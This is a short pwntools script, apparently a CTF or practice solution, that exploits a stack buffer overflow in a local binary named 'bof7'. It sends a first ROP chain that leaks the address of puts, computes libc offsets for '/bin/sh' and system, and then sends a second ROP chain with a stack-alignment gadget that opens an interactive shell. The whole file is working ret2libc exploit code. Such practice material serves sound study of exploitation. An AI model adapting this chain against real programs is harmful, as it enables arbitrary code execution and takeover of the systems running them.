from pwn import *
exe=ELF('./bof7',checksec=False)
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
p=process("./bof7")
payload=b'a'*88
payload+=p64(0x0000000000401263)+p64(0x403fd8)+p64(0x0000000000401064)+p64(0x4011bd)
#print(hex(exe.got['puts']))
#print(hex(exe.plt['puts']))
#input()
p.sendafter(b'something: \n',payload)
#print(hex(libc.sym['puts']))
a=u64(p.recv(6)+b'\0\0')
#libc.address=a-libc.sym['puts']

# print(hex(a+1210628))
# print(hex(a-185488))
# print(hex(next(libc.search('/bin/sh'))))
# print(hex(libc.sym['system']))
#p.interactive()
#input()
'''
stack alignment
'''
payload=b'a'*88
payload+=p64(0x0000000000401263)+p64(a+1210628)+p64(0x000000000040101a)+p64(a-185488)
p.sendafter(b'something: \n',payload)
p.interactive()
